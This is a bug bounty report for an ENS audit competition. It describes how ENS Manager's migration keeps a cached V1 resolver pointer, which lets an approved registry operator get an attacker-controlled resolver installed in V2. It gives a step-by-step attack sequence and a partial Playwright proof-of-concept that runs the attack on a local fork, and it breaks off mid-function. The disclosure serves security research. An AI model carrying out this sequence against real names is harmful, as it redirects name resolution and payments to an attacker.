# 92611 w a medium stale v1 resolver snapshot migrates an attacker controlled resolver after v1 recovery

**Submitted on Sep 10th 2026 at 22:36:28 UTC by @Paulius for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92611
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow

## Description

## Brief/Intro

Manager takes the resolver address for a V1 name from its migration discovery response and preserves an unknown custom resolver through the `keep-v1` strategy. That address is saved in the migration plan and is not read from the V1 registry again before the final transaction. A delegated V1 registry operator can temporarily assign an attacker-owned PermissionedResolver while Manager builds the plan, restore the legitimate V1 resolver during the normal multi-transaction migration flow, and still have the victim's confirmed migration install the attacker resolver in V2. The attacker retains record authority on that resolver and can make the migrated victim name resolve to an attacker-controlled address.

## Vulnerability Details

### The attacker has a normal, production-supported way to produce the source value

The relevant source is the resolver pointer stored for `namehash(victim.eth)` in the deployed Sepolia Legacy ENS Registry at `0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e`. It is not an address record returned by a resolver.

The Legacy ENS Registry authorizes both the node owner and an operator approved by that owner. Its `authorised(bytes32)` modifier accepts either `owners[node] == msg.sender` or `operators[owners[node]][msg.sender]`, and `setResolver(bytes32,address)` is protected by that modifier. A normally delegated registry operator can therefore change the resolver pointer without becoming the BaseRegistrar registrant or the registry owner shown in `domain.owner`.

The attacker-controlled destination can be a genuine PermissionedResolver rather than an arbitrary contract with a compatible ABI. Explorer's normal resolver deployment path calls the configured `ensVerifiableFactory` with the pinned `ensPermissionedResolverImpl` and initializes the proxy as follows:

```ts
const deployCalldata = encodeFunctionData({
  abi: verifiableFactoryAbi,
  functionName: 'deployProxy',
  args: [permissionedResolverImpl, salt, getResolverInitCalldata(from)],
})
```

`getResolverInitCalldata` grants the deploying account the full root bitmap:

```ts
export const getResolverInitCalldata = (ownerAddress: Address): Hex => {
  return encodeFunctionData({
    abi: permissionedResolverInitAbi,
    functionName: 'initialize',
    args: [ownerAddress, permissionedResolverRoleBitmap, []],
  })
}
```

Those root permissions include `ROLE_SET_ADDR` and apply across nodes on that resolver. Explorer recognizes the proxy as a PermissionedResolver by reading its EIP-1967 implementation slot and matching the pinned implementation. The attacker therefore has a supported resolver type and an exact record-writing role for the victim node once V2 points the name to this proxy.

These authorities remain separate:

* The victim is the BaseRegistrar registrant and Legacy ENS Registry owner.
* The attacker is only an approved Legacy ENS Registry operator.
* The attacker separately owns and administers the deployed PermissionedResolver proxy.
* The attacker does not need wrapper ownership, a subname-manager role, a V2 registry role, or write access on an allowlisted V1 public resolver.

### Manager snapshots the resolver pointer from indexed V1 state

Manager's V1 discovery query reads the resolver address together with the owner and registrant:

```graphql
domains(...) {
  id
  labelName
  labelhash
  name
  resolver { address }
  owner { id }
  registrant { id }
  wrappedOwner { id }
  ...
}
```

The response is cached for five minutes. `classifyName` copies the value into `v1ResolverAddress`:

```ts
const v1ResolverAddress = domain.resolver?.address ?? null
```

The resolver strategy treats every non-null resolver outside `KNOWN_PUBLIC_RESOLVERS` as a custom resolver that should be preserved:

```ts
if (v1ResolverAddress && !isKnownPublicResolver(v1ResolverAddress)) {
  return 'keep-v1'
}
```

A unique proxy deployed by an ordinary user is not in the static public-resolver allowlist. The attacker's genuine PermissionedResolver therefore takes the intended production `keep-v1` path.

This does not require stale or incorrect indexer behavior. The pointer can remain set to the attacker proxy long enough to become ordinary indexed state and for the victim to open the migration flow. The flaw begins after Manager has accepted that state and retained it in the client-side plan.

### The final batch does not refresh the V1 resolver

`buildMigrationPlan` stores the classified names, including `v1ResolverAddress`, in `MigrationPlan.classified`. Before opening the first wallet prompt, `assertMigrationApprovalPlanCurrent` refreshes token and operator approvals, but it does not read the Legacy ENS Registry resolver.

Before each final atomic batch, `buildNextAtomicBatch` refreshes only HCA resolver readiness and V2 migration routes:

```ts
const resolverReadiness =
  await checkDeterministicMigrationResolverReadiness(...)

const directRoutes = await resolveDirectMigrationRoutes({
  publicClient: ctx.publicClient,
  classified: remaining,
})
```

It then rebuilds the batch from the saved `remaining` objects:

```ts
const atomicPlan = await buildAtomicMigrationBatches({
  classified: remaining,
  directRoutes,
  profiles: plan.profiles,
  ...
})
```

No execution-time read compares `ClassifiedName.v1ResolverAddress` with `LegacyENSRegistry.resolver(namehash(name))`. The attacker can therefore restore the victim's legitimate V1 resolver after a preliminary migration approval has confirmed that the plan already exists, while Manager continues using the earlier pointer.

### The cached pointer is committed as `Migration.Data.resolver`

For the `keep-v1` strategy, `resolverFor` returns the saved custom address directly:

```ts
case 'keep-v1':
  return (
    isKnownPublicResolver(name.v1ResolverAddress)
      ? defaultResolver
      : (name.v1ResolverAddress ?? defaultResolver)
  ) as Address
```

`buildNameExecution` places that address into the migration payload:

```ts
const expectedResolver = resolverFor(classified, defaultResolver, resolver)
const migrationData = createMigrationData({
  label: classified.label,
  owner: wallet,
  subregistry: zeroAddress,
  resolver: expectedResolver,
})
```

The migration helper then encodes the data in its `migrate` call. The repository's migration case study documents that the unwrapped and unlocked migration receivers use `Data.owner`, `Data.resolver`, and `Data.subregistry` when registering the name in V2.

The migration call is included in an HCA owner-execution batch that the connected victim wallet signs. The transaction manager submits the outer call and waits for its receipt. This is a real signed state change, not a misleading preview or an unsent transaction.

### Post-state verification accepts the stale resolver as success

The batch creates a `name-resolver` expectation from `expectedResolver`, which is the same cached address used in the migration payload. After confirmation, `verifyAtomicMigrationBatch` reads the V2 registry:

```ts
const resolver = await context.publicClient.readContract({
  address: registry,
  abi: permissionedRegistryReadAbi,
  functionName: 'getResolver',
  args: [expectation.label],
  ...block,
})
return isAddressEqual(resolver, expectation.expectedResolver)
```

This verifies that the attacker proxy was installed. It never compares the result with the live V1 resolver that existed before the victim signed. Manager consequently reports the migration as verified.

The wallet confirmation text says only, "Migrate the selected names and restore their records." It does not display the resolver address or warn that a previously observed custom resolver will be preserved.

### Attack sequence

1. The victim is the BaseRegistrar registrant and Legacy ENS Registry owner for an unwrapped V1 `.eth` name.
2. The attacker is an ordinary registry operator previously approved by the victim. This permission does not make the attacker the registrant or current registry owner.
3. The attacker deploys a PermissionedResolver proxy through the configured factory. The proxy is initialized with the attacker holding wildcard resolver roles.
4. The attacker writes an attacker-controlled address for the victim node on that resolver.
5. Using the delegated Legacy ENS Registry operator permission, the attacker temporarily sets the victim name's V1 resolver pointer to the attacker proxy.
6. The victim opens Manager and prepares the migration. The indexed V1 response contains the attacker proxy, and the plan saves it as a custom `keep-v1` resolver.
7. The victim starts migration and confirms a normal preliminary approval transaction.
8. The attacker observes that the migration is in progress and calls `setResolver` again to restore the victim's legitimate V1 resolver. The live V1 name is now configured correctly.
9. The victim continues the already prepared Manager flow and confirms the final atomic migration transaction.
10. Manager sends the saved attacker proxy as `Data.resolver`. The V2 registration is created for the victim but points to the attacker-administered resolver.
11. Verification checks for that cached resolver, accepts the result, and reports success.
12. Resolution of the migrated name returns the address controlled by the attacker through the attacker's wildcard resolver role.

The required fix is to re-read the current V1 resolver pointer before each final batch and invalidate or reconfirm the plan if it changed. Revalidating other V1 fields is not sufficient because the value that reaches the receiver is `Migration.Data.resolver`.

## Impact Details

This matches the program's Critical impact for hijacking an ENS name during a Manager migration. The victim owns the resulting V2 registration, but the confirmed Manager transaction assigns its resolver to an attacker-administered contract even though the live V1 resolver was legitimate before signing.

The attacker can use the resolver role it already holds on that proxy to return its own address for the victim name. Wallets and applications that resolve the migrated name can consequently show or use an unintended payment address. The victim can eventually replace the resolver because they still own the V2 name, but the name remains hijacked until they notice and complete that recovery. Permanent loss of the registration token is not required by the selected migration-hijack impact.

The decisive harmful action is the victim's sent and confirmed Manager migration. The attacker's earlier V1 pointer changes have been reversed before that transaction, and the attacker's V1 operator status does not grant any V2 registry permission. Manager is what carries the obsolete attacker-controlled pointer across the protocol boundary and verifies it as the intended result.

## References

* [Competition-branch Manager asset snapshot](https://github.com/immunefi-team/audit-comp-ens/tree/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager): immutable competition-branch snapshot corresponding to the selected program asset.
* [Verified Sepolia Legacy ENS Registry source](https://sepolia.etherscan.io/address/0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e#code), pinned by deployed address: `ENSRegistry.authorised(bytes32)` and the guarded `setResolver(bytes32,address)` function. The same implementation is available in the [commit-pinned canonical source](https://github.com/ensdomains/ens-contracts/blob/be53b9c25be5b2c7326f524bbd34a3939374ab1f/contracts/registry/ENSRegistry.sol).
* [apps/manager/src/features/migration/service/v1SubgraphClient.ts:22-47](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/v1SubgraphClient.ts#L22-L47): V1 discovery source for resolver, owner, and registrant.
* [apps/manager/src/features/migration/hooks/useV1Names.ts:12-23](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/hooks/useV1Names.ts#L12-L23): five-minute query cache.
* [packages/migration/src/service/classifyNames.ts:65-88](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/migration/src/service/classifyNames.ts#L65-L88): resolver snapshot and `keep-v1` classification.
* [packages/migration/src/contracts/knownResolvers.ts:5-24](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/migration/src/contracts/knownResolvers.ts#L5-L24): static known-public-resolver list.
* [apps/manager/src/features/migration/service/encodeMigration.ts:12-50](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/encodeMigration.ts#L12-L50): cached custom resolver selection and migration data construction.
* [apps/manager/src/features/migration/service/buildMigrationPlan.ts:317-380](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildMigrationPlan.ts#L317-L380): plan construction and retention of classified inputs.
* [apps/manager/src/features/migration/service/migrationService.ts:338-390](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/migrationService.ts#L338-L390), [886-960](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/migrationService.ts#L886-L960), [1044-1107](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/migrationService.ts#L1044-L1107), [1169-1204](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/migrationService.ts#L1169-L1204): approval reconciliation, final batch rebuild, submission, and verification flow.
* [apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:479-491](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts#L479-L491), [544-566](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts#L544-L566), [742-815](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts#L742-L815): `Data.resolver`, expected post-state, migration phase, and HCA outer call.
* [apps/manager/src/features/migration/service/verifyAtomicMigrationBatch.ts:249-275](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/verifyAtomicMigrationBatch.ts#L249-L275): cached resolver post-state verification.
* [apps/manager/src/features/migration/MIGRATION\_CASE\_STUDY.md:68-100](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/MIGRATION_CASE_STUDY.md#L68-L100): unwrapped and unlocked receiver behavior.
* [apps/manager/src/features/migration/components/WalletConfirmationStepsDialog.tsx:91-108](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/components/WalletConfirmationStepsDialog.tsx#L91-L108): generic confirmation text that omits the resolver address.
* [apps/portal/src/features/resolver/hooks/useDeployPermissionedResolver.ts:37-76](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/hooks/useDeployPermissionedResolver.ts#L37-L76): factory-backed PermissionedResolver deployment.
* [apps/portal/src/features/resolver/utils/permissionedResolver.ts:13-45](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/utils/permissionedResolver.ts#L13-L45): PermissionedResolver initializer and full root-role bitmap.
* [apps/portal/src/features/resolver/hooks/useIsPermissionedResolver.ts:13-66](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/hooks/useIsPermissionedResolver.ts#L13-L66): production recognition of proxies using the pinned implementation.
* [apps/portal/src/features/records/hooks/useCanEditRecords.ts:12-18](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/records/hooks/useCanEditRecords.ts#L12-L18), [35-41](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/records/hooks/useCanEditRecords.ts#L35-L41), [73-116](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/records/hooks/useCanEditRecords.ts#L73-L116): PermissionedResolver record roles.
* [apps/portal/src/features/records/helpers/saveRecords.ts:97-149](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/records/helpers/saveRecords.ts#L97-L149): supported record-write construction.
* [packages/transaction-manager/src/actors/eoa-transport.actor.ts:35-70](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/transaction-manager/src/actors/eoa-transport.actor.ts#L35-L70): final EOA transaction submission.

## Link to Proof of Concept

<https://gist.github.com/pauliax/fa439d52030f819ebdf7dff1c8ae29f1>

## Proof of Concept

## Proof of Concept

The executable local PoC is `e2e/projects/manager/tests/migration-resolver-pointer.spec.ts`, test `migrates a restored name with the previewed custom resolver`. It creates the V1 name and attacker PermissionedResolver on the local Sepolia fork, feeds the attacker resolver through Manager's V1 discovery boundary, restores the live V1 resolver and revokes the attacker's V1 registry operator authority after the documented per-token Manager approval transaction, decodes the final Manager migration request before authorizing it, and verifies the resulting V2 resolver plus attacker-controlled resolver record.

Run it only against the repository's isolated local stack:

```bash
pnpm e2e:infra:up
pnpm --dir e2e exec playwright test projects/manager/tests/migration-resolver-pointer.spec.ts --config projects/manager/playwright.migration-poc.config.ts
```

Local validation: the successful run confirmed the restored V1 resolver and revoked attacker V1 operator approval before final authorization, the stale attacker resolver in final HCA calldata, V2 registration with that resolver, and attacker-controlled record mutation after migration.

The PoC artifact contains two local Manager edits. Under `import.meta.env.DEV && VITE_E2E_FORCE_MIGRATION === 'true'`, `get-feature-flag.ts` returns `true` only for the migration feature flag; under that same condition, `useMigrationGasFunding.ts` skips the local `/wallet/fund` query and returns `settled` because Anvil accounts are pre-funded. Neither edit affects plan construction, approval sequencing, final calldata, post-state verification, or cleanup. They only make the isolated local E2E flow runnable and do not change production behavior.

The local patch is limited to the following guards and return-path changes:

```ts
const isLocalE2EMigration =
  import.meta.env.DEV && import.meta.env.VITE_E2E_FORCE_MIGRATION === 'true'

if (isLocalE2EMigrationFlag(data.flag)) return true

const enabled = !!ownerAddress && !isLocalE2EMigration
if (!ownerAddress) return 'idle'
if (isLocalE2EMigration) return 'settled'
```

The following is the corresponding reproduction procedure.

1. Use separate local accounts for victim V and attacker A. Create exactly one unwrapped V1 `.eth` registration whose BaseRegistrar registrant and Legacy ENS Registry owner are V. Before opening Manager, clear any existing MigrationHelper approval from V on the BaseRegistrar. Assert that `getApproved(tokenId)` is the zero address and `isApprovedForAll(V, MigrationHelper)` is false.
2. Have V grant A Legacy ENS Registry operator approval. Confirm that V remains both the registrant and registry owner.
3. Through the configured local VerifiableFactory, deploy a proxy of the pinned PermissionedResolver implementation from A. Confirm the proxy implementation and that A has the root `ROLE_SET_ADDR` permission.
4. On that proxy, set the coin type 60 address for `namehash(label.eth)` to A.
5. From A, use the operator-authorized Legacy ENS Registry `setResolver` function to set the V1 resolver for the node to the attacker proxy. Confirm the registry owner is still V.
6. Present that actual local V1 state through the repository's V1 discovery boundary, open Manager as V, select the name, and wait until the migration preview is ready.
7. Begin the ordinary migration and complete any required HCA deployment request. The test fails if it observes a BaseRegistrar `setApprovalForAll(MigrationHelper, true)` request. When the selected token's BaseRegistrar request decodes to `approve(MigrationHelper, tokenId)`, confirm it and keep the existing page and migration flow open.
8. From A, call the Legacy ENS Registry `setResolver` function again and restore the legitimate pre-attack resolver. From V, revoke A's Legacy ENS Registry operator approval. Confirm directly that the live V1 resolver is legitimate and that `isApprovedForAll(V, A)` is false before the final migration transaction is signed.
9. Continue the same Manager flow until it produces the final atomic migration wallet request. Before authorizing that request, decode the outer HCA owner-execution call and its nested MigrationHelper call. Assert that the relevant `Data.resolver` equals the attacker proxy, then read the Legacy ENS Registry again and assert that its live resolver is legitimate and A's operator approval remains revoked.
10. Approve the decoded final migration transaction and record its receipt.
11. Read the resulting V2 registration status and resolver. The expected vulnerable result is that the name is registered in V2 with the attacker proxy as its resolver.
12. Confirm that Manager reaches its successful verified state and that A's existing root resolver role can return A for the migrated name's coin type 60 record.

Expected behavior:

Manager should read the current Legacy ENS Registry resolver immediately before constructing each final batch. If it differs from the previewed value, Manager should invalidate the plan and require the user to review the updated resolver. The exact resolver address should also be shown in the confirmation step.

Actual behavior:

Manager uses the preview-time resolver pointer, installs the attacker proxy in V2, verifies that same cached address, and reports the migration as complete.

```ts
// e2e/projects/manager/tests/migration-resolver-pointer.spec.ts

import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import {
  type Web3ProviderBackend,
  Web3RequestKind,
} from '@ensdomains/headless-web3-provider'
import type { Page } from '@playwright/test'
import {
  type Address,
  decodeEventLog,
  decodeFunctionData,
  encodeFunctionData,
  getAddress,
  type Hex,
  isAddress,
  isAddressEqual,
  isHex,
  keccak256,
  namehash,
  parseAbi,
  toHex,
  zeroAddress,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import {
  createMakeV1Name,
  V1_BASE_REGISTRAR,
  V1_ENS_REGISTRY,
  V1_PUBLIC_RESOLVER,
} from '../../../fixtures/makeV1Name.js'
import { expect, test } from '../../../fixtures/playwright.manager.fixture.js'
import { publicClient, walletClient } from '../../../helpers/anvil-client.js'
import {
  assertV2Registered,
  assertV2Resolver,
} from '../../../helpers/migration-assertions.js'
import { mockV1Subgraph } from '../../../helpers/mock-v1-subgraph.js'
import { subregistryInitializeSnippet } from '../../../helpers/permissioned-resolver-abi.js'

const MANAGER_APP_URL = process.env.MANAGER_APP_URL ?? 'http://localhost:3000'
const COIN_TYPE_ETH = 60n
const FULL_ROLE_BITMAP =
  0x1111111111111111111111111111111111111111111111111111111111111111n
const MIGRATION_HELPER: Address = '0xddC597d937618849348E18Db5D631Ce747bCDeEF'

const ensjsSepolia = ensL1Contracts[supportedL1Chains.sepolia]
const PERMISSIONED_RESOLVER_IMPL =
  ensjsSepolia.ensPermissionedResolverImpl.address
const VERIFIABLE_FACTORY = ensjsSepolia.ensVerifiableFactory.address

const HCA_OWNER_EXECUTION_ABI = parseAbi([
  'function executeByOwner((address target, uint256 value, bytes callData)[] executions) payable',
])

const MIGRATION_HELPER_ABI = parseAbi([
  'function migrate((string label,address owner,address subregistry,address resolver)[] unwrapped,(string label,address owner,address subregistry,address resolver)[][] unlockedGroups,(string label,address owner,address subregistry,address resolver)[][] lockedGroups,(bytes parentName,(string label,address owner,address subregistry,address resolver)[][] groups)[] lockedChildrenGroups)',
])

const VERIFIABLE_FACTORY_ABI = parseAbi([
  'function deployProxy(address implementation, uint256 salt, bytes data)',
  'function verifyContract(address proxy) view returns (address implementation)',
  'event ProxyDeployed(address indexed sender, address indexed proxyAddress, uint256 salt, address implementation)',
])

const V1_BASE_REGISTRAR_ABI = parseAbi([
  'function approve(address to, uint256 tokenId)',
  'function getApproved(uint256 tokenId) view returns (address)',
  'function isApprovedForAll(address owner, address operator) view returns (bool)',
  'function setApprovalForAll(address operator, bool approved)',
])

const V1_ENS_REGISTRY_ABI = parseAbi([
  'function isApprovedForAll(address owner, address operator) view returns (bool)',
  'function owner(bytes32 node) view returns (address)',
  'function resolver(bytes32 node) view returns (address)',
  'function setApprovalForAll(address operator, bool approved)',
  'function setResolver(bytes32 node, address resolver)',
])

const PERMISSIONED_RESOLVER_ABI = parseAbi([
  'function addr(bytes32 node, uint256 coinType) view returns (bytes)',
  'function hasRootRoles(uint256 roleBitmap, address account) view returns (bool)',
  'function initialize(address admin, uint256 roleBitmap, bytes[] setters)',
  'function setAddr(bytes32 node, uint256 coinType, bytes addr)',
])

type Account = ReturnType<typeof privateKeyToAccount>

type CapturedTransaction = {
  readonly from?: Hex
  readonly to?: Hex
  readonly data?: Hex
  readonly value?: Hex
}

type OwnerExecution = {
  readonly target: Hex
  readonly value: bigint
  readonly callData: Hex
}

type MigrationData = {
  readonly label: string
  readonly owner: Hex
  readonly subregistry: Hex
  readonly resolver: Hex
}

function tokenIdFor(label: string): bigint {
  return BigInt(keccak256(toHex(label)))
}

async function waitForSuccess(hash: Hex) {
  const receipt = await publicClient.waitForTransactionReceipt({ hash })
  expect(receipt.status).toBe('success')
  return receipt
}

function parseProxyDeployed(
  logs: readonly { topics: readonly Hex[]; data: Hex }[],
) {
  for (const log of logs) {
    if (log.topics.length === 0) continue
    try {
      const decoded = decodeEventLog({
        abi: VERIFIABLE_FACTORY_ABI,
        topics: log.topics as [Hex, ...Hex[]],
        data: log.data,
      })
      if (decoded.eventName === 'ProxyDeployed') {
        return decoded.args.proxyAddress
      }
    } catch {
      // Ignore non-VerifiableFactory logs.
    }
  }
  throw new Error('ProxyDeployed event not found')
}

async function deployAttackerResolver(label: string, attacker: Account) {
  const salt = BigInt(keccak256(toHex(`${label}:resolver-pointer`)))
  const initCalldata = encodeFunctionData({
    abi: subregistryInitializeSnippet,
    functionName: 'initialize',
    args: [attacker.address, FULL_ROLE_BITMAP, []],
  })
  const hash = await walletClient.sendTransaction({
    account: attacker,
    to: VERIFIABLE_FACTORY,
    data: encodeFunctionData({
      abi: VERIFIABLE_FACTORY_ABI,
      functionName: 'deployProxy',
      args: [PERMISSIONED_RESOLVER_IMPL, salt, initCalldata],
    }),
  })
  const receipt = await waitForSuccess(hash)
  const resolver = parseProxyDeployed(receipt.logs)

  const implementation = await publicClient.readContract({
    address: VERIFIABLE_FACTORY,
    abi: VERIFIABLE_FACTORY_ABI,
    functionName: 'verifyContract',
    args: [resolver],
  })
  expect(isAddressEqual(implementation, PERMISSIONED_RESOLVER_IMPL)).toBe(true)
  await expect(
    publicClient.readContract({
      address: resolver,
      abi: PERMISSIONED_RESOLVER_ABI,
      functionName: 'hasRootRoles',
      args: [FULL_ROLE_BITMAP, attacker.address],
    }),
  ).resolves.toBe(true)

  return resolver
}

async function setV1Resolver(account: Account, node: Hex, resolver: Hex) {
  await waitForSuccess(
    await walletClient.sendTransaction({
      account,
      to: V1_ENS_REGISTRY,
      data: encodeFunctionData({
        abi: V1_ENS_REGISTRY_ABI,
        functionName: 'setResolver',
        args: [node, resolver],
      }),
    }),
  )
}

async function readV1Resolver(node: Hex) {
  return publicClient.readContract({
    address: V1_ENS_REGISTRY,
    abi: V1_ENS_REGISTRY_ABI,
    functionName: 'resolver',
    args: [node],
  })
}

async function setAttackerRecord(
  resolver: Hex,
  account: Account,
  node: Hex,
  value: Hex,
) {
  await waitForSuccess(
    await walletClient.sendTransaction({
      account,
      to: resolver,
      data: encodeFunctionData({
        abi: PERMISSIONED_RESOLVER_ABI,
        functionName: 'setAddr',
        args: [node, COIN_TYPE_ETH, value],
      }),
    }),
  )
}

async function readResolverAddress(resolver: Hex, node: Hex) {
  return publicClient.readContract({
    address: resolver,
    abi: PERMISSIONED_RESOLVER_ABI,
    functionName: 'addr',
    args: [node, COIN_TYPE_ETH],
  })
}

async function clearReusableMigrationApproval(owner: Account) {
  const approved = await publicClient.readContract({
    address: V1_BASE_REGISTRAR,
    abi: V1_BASE_REGISTRAR_ABI,
    functionName: 'isApprovedForAll',
    args: [owner.address, MIGRATION_HELPER],
  })
  if (!approved) return

  await waitForSuccess(
    await walletClient.sendTransaction({
      account: owner,
      to: V1_BASE_REGISTRAR,
      data: encodeFunctionData({
        abi: V1_BASE_REGISTRAR_ABI,
        functionName: 'setApprovalForAll',
        args: [MIGRATION_HELPER, false],
      }),
    }),
  )
}

async function setV1RegistryOperatorApproval(
  owner: Account,
  operator: Hex,
  approved: boolean,
) {
  await waitForSuccess(
    await walletClient.sendTransaction({
      account: owner,
      to: V1_ENS_REGISTRY,
      data: encodeFunctionData({
        abi: V1_ENS_REGISTRY_ABI,
        functionName: 'setApprovalForAll',
        args: [operator, approved],
      }),
    }),
  )
}

async function readV1RegistryOperatorApproval(owner: Account, operator: Hex) {
  return publicClient.readContract({
    address: V1_ENS_REGISTRY,
    abi: V1_ENS_REGISTRY_ABI,
    functionName: 'isApprovedForAll',
    args: [owner.address, operator],
  })
}

async function approveV1RegistryOperator(owner: Account, operator: Hex) {
  await setV1RegistryOperatorApproval(owner, operator, true)
  await expect(readV1RegistryOperatorApproval(owner, operator)).resolves.toBe(
    true,
  )
}

async function revokeV1RegistryOperator(owner: Account, operator: Hex) {
  await setV1RegistryOperatorApproval(owner, operator, false)
  await expect(readV1RegistryOperatorApproval(owner, operator)).resolves.toBe(
    false,
  )
}

async function installSendTransactionCapture(page: Page) {
  await page.addInitScript(() => {
    type EthereumLike = {
      request?: (request: unknown) => Promise<unknown>
      __migrationCaptureInstalled?: boolean
    }
    type HeadlessProviderBridge = (
      method: unknown,
      ...args: unknown[]
    ) => Promise<unknown>
    type Eip6963AnnounceEvent = Event & {
      detail?: {
        provider?: EthereumLike
      }
    }
    type CapturedWindow = Window &
      typeof globalThis & {
        ethereum?: EthereumLike
        __injectedHeadlessWeb3ProviderRequest?: HeadlessProviderBridge
        __migrationProviderBridgeCaptureInstalled?: boolean
        __migrationSendTransactions?: unknown[]
      }

    const capturedWindow = window as CapturedWindow
    capturedWindow.__migrationSendTransactions = []

    const capture = (request: unknown) => {
      if (
        typeof request === 'object' &&
        request !== null &&
        'method' in request &&
        request.method === 'eth_sendTransaction'
      ) {
        const params =
          'params' in request && Array.isArray(request.params)
            ? request.params
            : []
        capturedWindow.__migrationSendTransactions?.push(params[0] ?? null)
      }
    }

    const install = (ethereum?: EthereumLike) => {
      if (!ethereum?.request || ethereum.__migrationCaptureInstalled) return

      const originalRequest = ethereum.request.bind(ethereum)
      ethereum.request = async (request: unknown) => {
        capture(request)
        return originalRequest(request)
      }
      ethereum.__migrationCaptureInstalled = true
    }

    const installProviderBridge = () => {
      if (
        !capturedWindow.__injectedHeadlessWeb3ProviderRequest ||
        capturedWindow.__migrationProviderBridgeCaptureInstalled
      ) {
        return
      }

      const originalRequest =
        capturedWindow.__injectedHeadlessWeb3ProviderRequest
      capturedWindow.__injectedHeadlessWeb3ProviderRequest = async (
        method,
        ...args
      ) => {
        if (method === 'request') capture(args[0])
        return originalRequest(method, ...args)
      }
      capturedWindow.__migrationProviderBridgeCaptureInstalled = true
    }

    window.addEventListener(
      'eip6963:announceProvider',
      (event: Eip6963AnnounceEvent) => {
        install(event.detail?.provider)
      },
      { capture: true },
    )

    install(capturedWindow.ethereum)
    installProviderBridge()
    window.setInterval(() => {
      install(capturedWindow.ethereum)
      installProviderBridge()
    }, 25)
  })
}

function isCapturedTransaction(value: unknown): value is CapturedTransaction {
  if (typeof value !== 'object' || value === null) return false
  const tx = value as Record<string, unknown>
  const validHex = (field: unknown) =>
    field === undefined || (typeof field === 'string' && isHex(field))
  return validHex(tx.from) && validHex(tx.to) && validHex(tx.data)
}

async function capturedTransactionAt(
  page: Page,
  index: number,
): Promise<CapturedTransaction> {
  await page.waitForFunction(
    (targetIndex) => {
      const currentWindow = window as Window &
        typeof globalThis & {
          __migrationSendTransactions?: unknown[]
        }
      return (
        (currentWindow.__migrationSendTransactions?.length ?? 0) > targetIndex
      )
    },
    index,
    { timeout: 60_000 },
  )
  const tx = await page.evaluate((targetIndex) => {
    const currentWindow = window as Window &
      typeof globalThis & {
        __migrationSendTransactions?: unknown[]
      }
    return currentWindow.__migrationSendTransactions?.[targetIndex] ?? null
  }, index)
  if (!isCapturedTransaction(tx)) {
    throw new Error(`Captured eth_sendTransaction ${index} was malformed`)
  }
  return tx
}

function decodeBaseRegistrarMigrationApprovalKind(
  tx: CapturedTransaction,
  tokenId: bigint,
) {
  if (!tx.to || !tx.data || !isAddress(tx.to)) return null
  if (!isAddressEqual(tx.to, V1_BASE_REGISTRAR)) return null

  try {
    const decoded = decodeFunctionData({
